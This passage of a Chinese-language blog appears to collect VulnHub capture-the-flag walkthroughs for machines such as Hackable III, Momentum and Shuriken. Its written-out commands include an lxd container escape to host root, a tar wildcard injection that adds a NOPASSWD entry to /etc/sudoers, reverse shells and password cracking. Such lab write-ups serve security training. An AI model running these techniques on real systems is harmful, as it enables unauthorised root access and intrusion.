alt="image-20210814185708000"></p><p>使用ssh登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814185911017.png" alt="image-20210814185911017"></p><p>查看home目录发现应该是有两个用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816093110878.png" alt="image-20210816093110878"></p><p>获取到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814190000585.png" alt="image-20210814190000585"></p><p>找一下敏感文件，在web目录下发现一个配置文件，里面有一个用户名和密码，尝试一下成功登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814192615628.png" alt="image-20210814192615628"></p><p>提权</p><ul><li><p><del>SUID提权</del></p></li><li><p><del>sudo提权</del></p></li><li><p><del>定时任务提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816101848774.png" alt="image-20210816101848774"></p><blockquote><p>存在一个以管理员身份定时执行的python脚本</p></blockquote><p>在文件夹下面未发现那个文件？？？？自己删自己吗？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816101950544.png" alt="image-20210816101950544"></p><p>也不能自己写文件</p><blockquote><p>后面看见有一个人是用的定时任务提权</p><p><a href="https://kerszl.github.io/hacking/walkthrough/hackable-iii/">https://kerszl.github.io/hacking/walkthrough/hackable-iii/</a></p><p>不懂为什么他直接猜出来了文件内容？？？</p></blockquote></li><li><p><del>内核漏洞提权</del> 先留着最后使用</p></li><li><p>lxd / lxc 提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816103421953.png" alt="image-20210816103421953"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">在kali攻击机上构建<br>git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/saghul/</span>lxd-alpine-builder.git<br>cd lxd-alpine-builder<br>./build-alpine<br></code></pre></td></tr></table></figure><p>构建好了之后利用scp命令将文件移动到靶机上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816104808086.png" alt="image-20210816104808086"></p><p>导入<code>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage</code></p><p>查看<code>lxc image list</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816105315274.png" alt="image-20210816105315274"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">漏洞靶机<br>lxd init<br>lxc init myimage ignite -c security.<span class="hljs-attribute">privileged</span>=<span class="hljs-literal">true</span><br>lxc<span class="hljs-built_in"> config </span>device <span class="hljs-builtin-name">add</span> ignite mydevice disk <span class="hljs-attribute">source</span>=/ <span class="hljs-attribute">path</span>=/mnt/root <span class="hljs-attribute">recursive</span>=<span class="hljs-literal">true</span><br>lxc start ignite<br>lxc exec ignite /bin/sh<br>之后就是root用户了，可以进入/mnt/root目录操作主机的所有目录<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816105230095.png" alt="image-20210816105230095"></p></li></ul><p>  <img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816104600712.png" alt="image-20210816104600712"></p><p><strong>总结</strong></p><ol><li><p>学习到的新东西：端口隐藏和端口碰撞 </p><p>端口碰撞技术是一种允许服务设备在用户按照约定的序列碰撞后，打开一个约定的服务端口提供服务的技术。所谓碰撞是由一个尝试访问系统中关闭端口的序列组成，也就是特定端口的连接请求</p><p><a href="https://zhuanlan.zhihu.com/p/210177505">https://zhuanlan.zhihu.com/p/210177505</a>  </p><p><a href="https://www.cnblogs.com/milton/p/14121214.html">https://www.cnblogs.com/milton/p/14121214.html</a></p></li><li><p>lxd /  lxc  提权</p><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p><p><a href="https://www.freebuf.com/articles/system/216803.html">https://www.freebuf.com/articles/system/216803.html</a></p></li></ol><p>参考文章</p><p><a href="https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/">https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/</a></p><h2 id="五、-Momentum-1"><a href="#五、-Momentum-1" class="headerlink" title="五、 Momentum: 1"></a>五、 Momentum: 1</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.17</p></blockquote><p>扫描主机ip和端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111017698.png" alt="image-20210816111017698"></p><p>扫描目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111319784.png" alt="image-20210816111319784"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111850304.png" alt="image-20210816111850304"></p><p>首页存在XSS</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111726937.png" alt="image-20210816111726937"></p><p><code>cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111959176.png" alt="image-20210816111959176"></p><blockquote><p>也可以直接F12查看cookie</p></blockquote><p> 解密Cookie：<code>auxerre-alienum##</code> 不知道有什么用</p><p><a href="https://tool.oschina.net/encrypt/">https://tool.oschina.net/encrypt/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816114927619.png" alt="image-20210816114927619"></p><ul><li><p><del>查找网站后台尝试密码</del>（没找到后台）</p></li><li><p>登录ssh</p><p>成功登录，用户名：<code>auxerre</code> 密码：<code>auxerre-alienum##</code>（多次 尝试就可以了）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115136551.png" alt="image-20210816115136551"></p></li></ul><p>得到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115329865.png" alt="image-20210816115329865"></p><p>提权</p><ul><li><p><del>SUID提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115514097.png" alt="image-20210816115514097"></p></li><li><p><del>sudo提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115602155.png" alt="image-20210816115602155"></p></li><li><p><del>定时任务提权</del>（也没有）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115904460.png" alt="image-20210816115904460"></p><p>但是发现了一个redis</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120155248.png" alt="image-20210816120155248"></p><p>连接上redis，然后查询所有的key，使用get获取指定key的值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120415536.png" alt="image-20210816120415536"></p><p>通过redis发现了root用户的密码</p><p>尝试直接登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120546646.png" alt="image-20210816120546646"></p><p>成功获取flag</p><blockquote><p>对于Redis的操作不熟悉，需要加强</p></blockquote></li></ul><p><strong>总结</strong></p><p>这个靶场整体思路比较简单，如果想到了就容易做，但是如果思路不对就容易卡死。由Cookie解密获得ssh登录的信息（这个现实应该不会有吧），利用redis获取到root用户的密码</p><h2 id="六、MOMENTUM-2"><a href="#六、MOMENTUM-2" class="headerlink" title="六、MOMENTUM: 2"></a>六、MOMENTUM: 2</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.19</p></blockquote><p>扫描主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135219734.png" alt="image-20210816135219734"></p><p>扫描目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135728304.png" alt="image-20210816135728304"></p><p>发现一个文件上传点和文件上传的逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"># /js/main.js<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadFile</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-keyword">var</span> files = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;file&quot;</span>).files;<br> <br>    <span class="hljs-keyword">if</span>(files.length &gt; <span class="hljs-number">0</span> )&#123;<br> <br>       <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> FormData();<br>       formData.append(<span class="hljs-string">&quot;file&quot;</span>, files[<span class="hljs-number">0</span>]);<br> <br>       <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();<br> <br>       <span class="hljs-comment">// Set POST method and ajax file path</span><br>       xhttp.open(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;ajax.php&quot;</span>, <span class="hljs-literal">true</span>);<br> <br>       <span class="hljs-comment">// call on request changes state</span><br>       xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.readyState == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-built_in">this</span>.status == <span class="hljs-number">200</span>) &#123;<br> <br>            <span class="hljs-keyword">var</span> response = <span class="hljs-built_in">this</span>.responseText;<br>            <span class="hljs-keyword">if</span>(response == <span class="hljs-number">1</span>)&#123;<br>               alert(<span class="hljs-string">&quot;Upload successfully.&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>               alert(<span class="hljs-string">&quot;File not uploaded.&quot;</span>);<br>            &#125;<br>          &#125;<br>       &#125;;<br> <br>       <span class="hljs-comment">// Send request with data</span><br>       xhttp.send(formData);<br> <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;Please select a file&quot;</span>);<br>    &#125;<br> <br> &#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135752058.png" alt="image-20210816135752058"></p><p>尝试上传文件获取shell</p><p>可以上传txt文件，然后上传的文件都在<code>/owls</code>中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816141536270.png" alt="image-20210816141536270"></p><p>目前没有头绪了，看了一眼WP，知道了还有一个备份文件<code>ajax.php.bak</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-regexp">//</span>The boss told me to add one more Upper Case letter at the end of the cookie<br> <span class="hljs-regexp">//</span>  在最后添加一个大写字母<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-string">&#x27;&amp;G6u@B6uDXMq&amp;Ms&#x27;</span>)&#123;<br>    <span class="hljs-regexp">//</span>[+] Add <span class="hljs-keyword">if</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;secure&#x27;</span>] == <span class="hljs-string">&#x27;val1d&#x27;</span><br>     <span class="hljs-variable">$valid_ext</span> = array(<span class="hljs-string">&quot;pdf&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;txt&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-variable">$valid_ext</span> = array(<span class="hljs-string">&quot;txt&quot;</span>);<br>&#125;<br><br><span class="hljs-regexp">//</span> Remember success upload returns <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>选择发送文件，然后再添加在post中发送一个值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816145535200.png" alt="image-20210816145535200"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816145648277.png" alt="image-20210816145648277"></p><p>上传成功，获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150152446.png" alt="image-20210816150152446"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150234824.png" alt="image-20210816150234824"></p><p>同时获得了一个用户的密码是<code>myvulnerableapp*</code> （最后这个居然是一个编码的，试了半天）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150912680.png" alt="image-20210816150912680"></p><p>提权</p><ul><li><p><del>SUID提权</del> （无）</p></li><li><p><del>SUDO提权</del>（好像存在）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816152204121.png" alt="image-20210816152204121"></p></li><li><p><del>定时程序提权</del> 使用pspy64监控进程发现没有可利用的</p></li><li><p>查看本地提示文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816153103729.png" alt="image-20210816153103729"></p><p>用户可以以管理员权限执行这个文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154331065.png" alt="image-20210816154331065"></p><p>代码的命令执行漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816153305188.png" alt="image-20210816153305188"></p><p>这个服务器居然装了nc的，尝试直接反弹shell没有反应</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154151777.png" alt="image-20210816154151777"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154129539.png" alt="image-20210816154129539"></p></li></ul><p><strong>问题</strong></p><ol><li><p>反弹shell命令失败，</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816155406823.png" alt="image-20210816155406823"></p></li></ol><p><strong>总结</strong></p><ol><li>我们需要充分利用已有的信息</li><li>对于提权，我们还是需要仔细查看系统中的内容</li><li>灵活运用系统漏洞</li></ol><p>参考</p><p><a href="https://nepcodex.com/2021/06/momentum-2-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/momentum-2-walkthrough-vulnhub-writeup/</a></p><p><a href="https://blog.csdn.net/qq_39991837/article/details/118596117">https://blog.csdn.net/qq_39991837/article/details/118596117</a></p><h2 id="七、Shuriken-1"><a href="#七、Shuriken-1" class="headerlink" title="七、Shuriken-1"></a>七、Shuriken-1</h2><blockquote><p>kali：192.168.1.15</p><p>win10： 192.168.1.7</p><p>靶机：192.168.1.115</p></blockquote><p>扫描主机和端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816165809786.png" alt="image-20210816165809786"></p><p>目录扫描</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816170051795.png" alt="image-20210816170051795"></p><p>有一个<code>secrete.png</code>这个是图片隐写吗？？？尝试之前的图片隐写操作结果失败</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816172553131.png" alt="image-20210816172553131"></p><p>修改本地hosts文件，就可以通过域名访问网站了，在这个地方就卡住了，然后看了一眼大师傅们的WP原来这里有个利用伪协议读取本地文件的漏洞</p><p>第一个域名访问是需要认证的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816174007524.png" alt="image-20210816174007524"></p><p>第二个存在文件读取漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816173232653.png" alt="image-20210816173232653"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816173147515.png" alt="image-20210816173147515"></p><blockquote><p>猜测可以通过读取文件来获得账户密码</p></blockquote><p>Apache的密码会存储在一个<code>.htpasswd</code>文件中，并且在<code>httpd.conf</code>中会保存密码文件的路径</p><p><a href="https://crayon-xin.github.io/2018/04/18/apach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81/">https://crayon-xin.github.io/2018/04/18/apach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81/</a></p><p>找这个路径是最要命的</p><p><a href="https://blog.csdn.net/bujidexinq/article/details/27187761">https://blog.csdn.net/bujidexinq/article/details/27187761</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816175709403.png" alt="image-20210816175709403"></p><p><img src="D:\markdown\image-20210816175643812.png" alt="image-20210816175643812"></p><blockquote><p>接下来需要解密这个密码</p><p>加密原理：<a href="https://www.cnblogs.com/LuckyOven/p/13614981.html">https://www.cnblogs.com/LuckyOven/p/13614981.html</a></p></blockquote><p>用户：developers 密码：9972761drmfsls</p><p>成功登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816181920197.png" alt="image-20210816181920197"></p><p>在漏洞库中找到了相关漏洞<a href="https://www.exploit-db.com/exploits/44250">https://www.exploit-db.com/exploits/44250</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816182732537.png" alt="image-20210816182732537"></p><p>直接上传不行，还需要传入用户名和密码来验证</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816183546486.png" alt="image-20210816183546486"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816183603060.png" alt="image-20210816183603060"></p><p>显示出自己的权限，这里显示可以以<code>server-management</code>的身份执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817092434784.png" alt="image-20210817092434784"></p><p>提权到<code>server-management</code>用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093734592.png" alt="image-20210817093734592"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093753823.png" alt="image-20210817093753823"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093809318.png" alt="image-20210817093809318"></p><blockquote><p>对于npm不是特别熟悉，但是大致思路就是利用server-management的权限使用npm执行/bin/bash命令</p></blockquote><p>获取到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817094411641.png" alt="image-20210817094411641"></p><p>提权到root</p><p>下载进程监控脚本到本地</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817094850293.png" alt="image-20210817094850293"></p><p>有一个自动备份的脚本，但是不能修改内容</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817095039895.png" alt="image-20210817095039895"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> &#x27;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;server-management ALL=(root) NOPASSWD: ALL&quot;</span> &gt;&gt; <span class="hljs-string">/etc/sudoers</span>&#x27; &gt; shell.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt; <span class="hljs-string">&quot;--checkpoint=1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102735136.png" alt="image-20210817102735136"></p><p>然后等待定时任务执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102817150.png" alt="image-20210817102817150"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102530242.png" alt="image-20210817102530242"></p><p><strong>问题</strong></p><ol><li><code>shell.sh</code>中填写<code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash</code> 时提权不成功</li><li>对于常规漏洞的第一反应不够快，对于外网漏洞的发掘能力有待提高</li><li>对于npm的操作不熟悉</li></ol><p><strong>总结</strong></p><p>这个靶场的漏洞整体来说感觉有点难度，对于这里的提权操作也是没有见过的新方法，需要后期再研究</p><h2 id="八、Shuriken-2"><a href="#八、Shuriken-2" class="headerlink" title="八、Shuriken-2"></a>八、Shuriken-2</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.127</p></blockquote><p>扫描主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104152019.png" alt="image-20210817104152019"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104326545.png" alt="image-20210817104326545"></p><p>扫描目录没什么东西</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104626601.png" alt="image-20210817104626601"></p><p>解密session，尝试伪造Admin用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817105635375.png" alt="image-20210817105635375"></p><blockquote><p>但是伪造了Admin之后也是需要登录的</p><p>到这里就卡住了</p></blockquote><p>看了一下提示，发现原文已经给了但是英语不好没反应过来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817111146345.png" alt="image-20210817111146345"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817110847690.png" alt="image-20210817110847690"></p><blockquote><p>去学习一下node.js的漏洞再说</p><p><a href="https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/">https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/</a></p></blockquote><p><a href="https://paper.seebug.org/213/">https://paper.seebug.org/213/</a></p><p>Payload：<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125353222.png" alt="image-20210817125353222"></p><p><img src="D:\markdown\image-20210817125307007.png" alt="image-20210817125307007"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125318745.png" alt="image-20210817125318745"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125335398.png" alt="image-20210817125335398"></p><p>准备提权，查看定时任务，发现没有可以利用的，然后使用提权辅助脚本<code>linpeas.sh</code>收集信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817131903195.png" alt="image-20210817131903195"></p><blockquote><p>这里发现了一个ssh的备份文件，利用curl下载到本地</p></blockquote><p>利用john爆破出密码，先将私钥转换为john可以利用的格式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134548923.png" alt="image-20210817134548923"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134355824.png" alt="image-20210817134355824"></p><p>获取到密码后登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134619133.png" alt="image-20210817134619133"></p><p>得到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134658865.png" alt="image-20210817134658865"></p><p>继续提取到root</p><ul><li><p><del>SUID提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140109610.png" alt="image-20210817140109610"></p></li><li><p>定时任务</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140049674.png" alt="image-20210817140049674"></p></li><li><p>可能会由sudo提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817135434239.png" alt="image-20210817135434239"></p><p><code>sudo -l</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140954562.png" alt="image-20210817140954562"></p><p>查看相关配置文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817141042952.png" alt="image-20210817141042952"></p><p><code>nano shuriken-job.service</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140914238.png" alt="image-20210817140914238"></p><p>配置文件的含义<a href="https://www.xiebruce.top/925.html">https://www.xiebruce.top/925.html</a></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">Unit</span>]区块：启动顺序与依赖关系<br><br>[<span class="hljs-meta">Service</span>] 区块：启动行为<br>定义如何启动当前服务<br>ExecStart 定义启动进程时需要执行的命令<br><br></code></pre></td></tr></table></figure><p>修改服务启动时的执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143301485.png" alt="image-20210817143301485"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143705955.png" alt="image-20210817143705955"></p><p>执行命令后，获取到shell（需要给脚本赋予可执行权限）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143756012.png" alt="image-20210817143756012"></p></li></ul><p><strong>问题</strong></p><ol><li>如何识别网站是否为node.js</li><li>对于ssh的多种连接方法的熟悉不够</li><li>启动服务的具体原理不够清楚</li></ol><p>参考文章</p><p><a href="https://kielvaughn.com/Shuriken-Node/">https://kielvaughn.com/Shuriken-Node/</a></p><h2 id="九、Grotesque"><a href="#九、Grotesque" class="headerlink" title="九、Grotesque"></a>九、Grotesque</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.20</p></blockquote><p>只扫描常规端口时发现只有80，并且80也访问不了，所以扫描全部端口多了一个66</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817145132262.png" alt="image-20210817145132262"></p><blockquote><p>这个服务器没有开22 端口？ 难道又是端口碰撞？</p></blockquote><p>目录扫描没有发现有用的东西，抓取网页链接时发现一个压缩包</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817151857118.png" alt="image-20210817151857118"></p><p>压缩包中有一个sshpasswd.png图片（又是图片隐写？？？）虚晃一枪</p><blockquote><p>拿到文件看了半天也没有思路，看了一下WP，下面不知道为什么要这样干</p><p>获取文件全部内容然后排序找到有用的东西</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817153829125.png" alt="image-20210817153829125"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817153813158.png" alt="image-20210817153813158"></p><p>这个是一个wordpress的站，再次扫描一下目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817154934684.png" alt="image-20210817154934684"></p><p>使用WPscan（没发现漏洞）</p><p>回到开始，查看网页源码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817160319707.png" alt="image-20210817160319707"></p><blockquote><p>这个图片好像也没有用</p></blockquote><p>接下来找到密码的操作属实把人看懵了</p><p><a href="https://vvmlist.github.io/walkthrough/grotesque/grotesque">https://vvmlist.github.io/walkthrough/grotesque/grotesque</a></p><p>这里直接使用用户名密码登录后续操作</p><p>用户名：<code>erdalkomurcu</code></p><p>密码：<code>BC78C6AB38E114D6135409E44F7CDDA2</code></p><p>登录成功，直接在修改主题的位置写入反弹shell的脚本，获取shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817164510468.png" alt="image-20210817164510468"></p><p>在网站的配置文件中发现了一个账户和密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165318047.png" alt="image-20210817165318047"></p><p>切换用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165448061.png" alt="image-20210817165448061"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165610772.png" alt="image-20210817165610772"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817172504471.png" alt="image-20210817172504471"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817172432365.png" alt="image-20210817172432365"></p><p>利用john爆破文件密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817173944797.png" alt="image-20210817173944797"></p><p><a href="https://app.keeweb.info/">https://app.keeweb.info/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817173903992.png" alt="image-20210817173903992"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817174014622.png" alt="image-20210817174014622"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817174039870.png" alt="image-20210817174039870"></p><p><strong>问题</strong></p><ol><li>对于kdbx文件的不了解</li></ol><p><strong>总结</strong></p><p>这个网站外网部分的脑洞比较大，到了找网站后台密码的时候就有点反应不过来了，然后就是对于一些文件后缀的不了解，容易错过重要文件</p><h2 id="十、Grotesque2"><a href="#十、Grotesque2" class="headerlink" 